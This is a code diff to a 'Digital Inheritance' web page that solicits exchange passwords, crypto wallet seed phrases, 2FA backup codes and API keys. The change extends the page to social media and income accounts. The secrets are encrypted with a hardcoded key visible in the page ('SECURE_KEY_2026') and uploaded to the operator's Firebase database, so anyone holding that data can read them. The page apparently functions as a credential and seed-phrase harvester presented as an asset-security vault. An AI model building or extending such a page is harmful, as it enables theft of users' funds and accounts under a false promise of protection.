@@ -14,7 +14,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
         body { font-family: 'Space Grotesk', sans-serif; background: #050505; color: #fff; }
         .glass-card { background: #0f0f0f; border: 1px solid #222; border-radius: 24px; padding: 24px; }
-        .platform-btn { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 16px; font-size: 11px; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
+        .platform-btn { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 16px; font-size: 11px; text-transform: uppercase; font-weight: bold; transition: 0.3s; color: #a1a1aa; }
         .platform-btn:active, .btn-active { border-color: #eab308; color: #eab308; background: #2a2a10; }
         .input-group label { display: block; font-size: 10px; color: #71717a; text-transform: uppercase; margin-bottom: 6px; margin-left: 4px; font-weight: bold; }
         input, textarea { background: #000 !important; border: 1px solid #333 !important; color: #fff !important; padding: 14px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 16px; font-size: 14px; }
@@ -27,66 +27,39 @@
         
         <header class="py-8">
             <h1 class="text-2xl font-black text-yellow-500 italic uppercase">Digital Inheritance</h1>
-            <p class="text-[10px] text-zinc-500 tracking-[0.3em] uppercase">Multi-Platform Asset Protection</p>
+            <p class="text-[10px] text-zinc-500 tracking-[0.3em] uppercase">Universal Asset Security</p>
         </header>
 
         <div class="glass-card mb-6">
             <div id="step-1">
-                <h3 class="text-[10px] font-bold text-zinc-500 uppercase mb-4 tracking-widest">1. Select Asset Category</h3>
+                <h3 class="text-[10px] font-bold text-zinc-500 uppercase mb-4 tracking-widest">1. Select Category</h3>
                 <div class="grid grid-cols-2 gap-3">
-                    <button onclick="showPlatforms('exchanges')" class="platform-btn"><i class="fa-solid fa-building-columns mb-2 block text-lg"></i>Crypto Exchanges</button>
+                    <button onclick="showPlatforms('exchanges')" class="platform-btn"><i class="fa-solid fa-building-columns mb-2 block text-lg"></i>Exchanges</button>
                     <button onclick="showPlatforms('wallets')" class="platform-btn"><i class="fa-solid fa-wallet mb-2 block text-lg"></i>Web3 Wallets</button>
+                    <button onclick="showPlatforms('social')" class="platform-btn"><i class="fa-solid fa-share-nodes mb-2 block text-lg"></i>Social Media</button>
+                    <button onclick="showPlatforms('income')" class="platform-btn"><i class="fa-solid fa-money-bill-trend-up mb-2 block text-lg"></i>Income Sites</button>
                 </div>
             </div>
 
             <div id="step-2" class="hidden mt-8">
-                <h3 class="text-[10px] font-bold text-zinc-500 uppercase mb-4 tracking-widest">2. Tag the Application</h3>
+                <h3 class="text-[10px] font-bold text-zinc-500 uppercase mb-4 tracking-widest">2. Tag Platform</h3>
                 <div id="platform-list" class="grid grid-cols-3 gap-2"></div>
             </div>
 
             <div id="step-3" class="hidden mt-8 border-t border-zinc-900 pt-6">
-                <div class="flex items-center gap-2 mb-6">
-                    <span id="tag-badge" class="bg-yellow-500/10 text-yellow-500 text-[10px] px-3 py-1 rounded-full border border-yellow-500/20 font-bold uppercase"></span>
-                </div>
+                <div class="mb-6"><span id="tag-badge" class="bg-yellow-500/10 text-yellow-500 text-[10px] px-3 py-1 rounded-full border border-yellow-500/20 font-bold uppercase"></span></div>
 
-                <div id="form-exchange" class="hidden">
-                    <div class="input-group">
-                        <label>Login Email / Username</label>
-                        <input type="text" id="ex-user" placeholder="e.g. user@gmail.com">
+                <div id="dynamic-fields">
                     </div>
-                    <div class="input-group">
-                        <label>Account Password</label>
-                        <input type="password" id="ex-pass" placeholder="••••••••">
-                    </div>
-                    <div class="input-group">
-                        <label>Registered Phone Number</label>
-                        <input type="text" id="ex-phone" placeholder="+92 3xx xxxxxxx">
-                    </div>
-                </div>
-
-                <div id="form-wallet" class="hidden">
-                    <div class="input-group">
-                        <label>Wallet Profile Name</label>
-                        <input type="text" id="wa-name" placeholder="e.g. My MetaMask 1">
-                    </div>
-                    <div class="input-group">
-                        <label>Secret Recovery Phrase (Seed)</label>
-                        <textarea id="wa-phrase" rows="3" placeholder="Enter 12 or 24 words..."></textarea>
-                    </div>
-                    <div class="input-group">
-                        <label>Wallet Access Password</label>
-                        <input type="password" id="wa-pass" placeholder="Unlock Password">
-                    </div>
-                </div>
 
                 <button onclick="processAndSave()" class="w-full bg-yellow-600 text-black font-black py-4 rounded-2xl uppercase tracking-tighter hover:bg-yellow-500 transition-all shadow-lg shadow-yellow-900/20">
-                    Lock Asset Permanently
+                    Secure Asset for Legacy
                 </button>
             </div>
         </div>
 
         <div id="vault-display" class="space-y-3">
-             <h3 class="text-[10px] font-bold text-zinc-600 uppercase tracking-widest px-2">Your Secured Assets</h3>
+             <h3 class="text-[10px] font-bold text-zinc-600 uppercase tracking-widest px-2">Current Secure Vault</h3>
         </div>
     </div>
 
@@ -104,9 +77,11 @@
         let currentCat = "";
         let currentApp = "";
 
-        const apps = {
+        const platformMap = {
             exchanges: ['Binance', 'OKX', 'ByBit', 'KuCoin', 'Coinbase'],
-            wallets: ['MetaMask', 'TrustWallet', 'Phantom', 'Ledger', 'SafePal']
+            wallets: ['MetaMask', 'TrustWallet', 'Phantom', 'Ledger', 'SafePal'],
+            social: ['YouTube', 'TikTok', 'Instagram', 'Facebook', 'X (Twitter)'],
+            income: ['Upwork', 'Fiverr', 'Google AdSense', 'Amazon', 'PayPal']
         };
 
         function showPlatforms(cat) {
@@ -114,41 +89,52 @@
             const list = document.getElementById('platform-list');
             document.getElementById('step-2').classList.remove('hidden');
             list.innerHTML = "";
-            apps[cat].forEach(app => {
+            platformMap[cat].forEach(app => {
                 list.innerHTML += `<button onclick="selectApp('${app}')" class="platform-btn border-zinc-800">${app}</button>`;
             });
-            window.scrollTo({ top: 200, behavior: 'smooth' });
         }
 
         function selectApp(app) {
             currentApp = app;
             document.getElementById('step-3').classList.remove('hidden');
             document.getElementById('tag-badge').innerText = "Securing: " + app;
+            renderFields();
+        }
+
+        function renderFields() {
+            const container = document.getElementById('dynamic-fields');
+            let html = "";
             
-            // Toggle form types
-            document.getElementById('form-exchange').classList.toggle('hidden', currentCat !== 'exchanges');
-            document.getElementById('form-wallet').classList.toggle('hidden', currentCat !== 'wallets');
+            if(currentCat === 'exchanges') {
+                html = `<div class="input-group"><label>Login Email</label><input type="text" id="f1"></div>
+                        <div class="input-group"><label>Password</label><input type="password" id="f2"></div>
+                        <div class="input-group"><label>Phone Number (for 2FA)</label><input type="text" id="f3"></div>`;
+            } else if(currentCat === 'wallets') {
+                html = `<div class="input-group"><label>Wallet Name</label><input type="text" id="f1"></div>
+                        <div class="input-group"><label>12/24 Word Seed Phrase</label><textarea id="f2" rows="3"></textarea></div>
+                        <div class="input-group"><label>Access Pin/Password</label><input type="password" id="f3"></div>`;
+            } else if(currentCat === 'social') {
+                html = `<div class="input-group"><label>Channel/Profile Link</label><input type="text" id="f1"></div>
+                        <div class="input-group"><label>Login Gmail/Email</label><input type="text" id="f2"></div>
+                        <div class="input-group"><label>Backup Codes / 2FA Key</label><textarea id="f3" rows="2"></textarea></div>`;
+            } else if(currentCat === 'income') {
+                html = `<div class="input-group"><label>Account Email</label><input type="text" id="f1"></div>
+                        <div class="input-group"><label>API Key / Merchant ID</label><input type="text" id="f2"></div>
+                        <div class="input-group"><label>Withdrawal Method Email</label><input type="text" id="f3"></div>`;
+            }
+            container.innerHTML = html;
         }
 
         function processAndSave() {
-            let assetData = {};
-            if(currentCat === 'exchanges') {
-                assetData = {
-                    user: document.getElementById('ex-user').value,
-                    pass: document.getElementById('ex-pass').value,
-                    phone: document.getElementById('ex-phone').value
-                };
-            } else {
-                assetData = {
-                    name: document.getElementById('wa-name').value,
-                    phrase: document.getElementById('wa-phrase').value,
-                    pass: document.getElementById('wa-pass').value
-                };
-            }
+            const data = {
+                field1: document.getElementById('f1').value,
+                field2: document.getElementById('f2').value,
+                field3: document.getElementById('f3').value
+            };
+            
+            if(!data.field1 || !data.field2) return alert("Fill mandatory fields!");
 
-            if(!Object.values(assetData).every(v => v)) return alert("Please fill all security boxes!");
-
-            const encrypted = CryptoJS.AES.encrypt(JSON.stringify(assetData), "VAULT_2026").toString();
+            const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), "SECURE_KEY_2026").toString();
             
             database.ref('vaults/' + auth.currentUser.uid).push({
                 app: currentApp,
@@ -156,33 +142,35 @@
                 payload: encrypted,
                 date: new Date().toLocaleDateString()
             }).then(() => {
-                alert(currentApp + " Security Data Saved!");
+                alert(currentApp + " Security Data Locked!");
                 location.reload();
             });
         }
 
         auth.onAuthStateChanged(user => {
-            if(user) { fetchVault(user.uid); }
-            else { window.location.href = "index.html"; }
+            if(user) fetchVault(user.uid);
+            else window.location.href = "index.html";
         });
 
         function fetchVault(uid) {
             database.ref('vaults/' + uid).on('value', snap => {
                 const display = document.getElementById('vault-display');
+                display.innerHTML = '<h3 class="text-[10px] font-bold text-zinc-600 uppercase tracking-widest px-2">Your Secured Assets</h3>';
                 snap.forEach(child => {
                     const item = child.val();
                     display.innerHTML += `
                         <div class="glass-card p-4 flex items-center justify-between border-l-4 border-yellow-600 mb-3">
                             <div>
-                                <h4 class="text-xs font-black uppercase">${item.app}</h4>
+                                <h4 class="text-xs font-black uppercase text-white">${item.app}</h4>
                                 <p class="text-[8px] text-zinc-500 font-bold uppercase">${item.category} • ${item.date}</p>
                             </div>
-                            <i class="fa-solid fa-lock text-zinc-800 text-xs"></i>
-                        </div>
-                    `;
+                            <button onclick="deleteAsset('${child.key}')"><i class="fa-solid fa-trash-can text-zinc-800 text-xs"></i></button>
+                        </div>`;
                 });
             });
         }
+
+        function deleteAsset(key) { if(confirm("Permanently delete?")) database.ref('vaults/' + auth.currentUser.uid + '/' + key).remove(); }
     </script>
 </body>
 </html>
